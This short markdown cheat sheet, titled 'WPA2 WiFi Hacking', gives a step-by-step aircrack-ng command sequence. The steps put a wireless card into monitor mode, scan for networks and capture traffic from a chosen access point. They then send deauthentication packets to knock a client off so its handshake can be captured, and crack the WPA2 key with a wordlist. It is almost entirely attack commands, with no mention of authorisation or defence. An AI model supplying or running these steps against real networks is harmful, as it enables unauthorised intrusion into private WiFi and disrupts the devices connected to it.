## WPA2 WiFi Hacking

### Enable monitor mode on wireless interface 

**List wireless interfaces supporting monitor mode**

```bash
airmon-ng
```

**Enable monitor mode**

```bash
airmon-ng start wlan0
```

### Scan for WiFi networks

```bash
airodump-ng wlan0mon
```

### Packet Capture

```bash
airodump-ng -c [channel] --bssid [bssid] -w /root/Desktop/ wlan0mon
```

### Inject packets/Capture Handshake

```bash
aireplay-ng -0 10 -a [router bssid] -c [client bssid] wlan0mon
```

### Cracking

```bash
aircrack-ng -a2 -b [router bssid] -w /path/to/wordlist /root/Desktop/*.cap
```

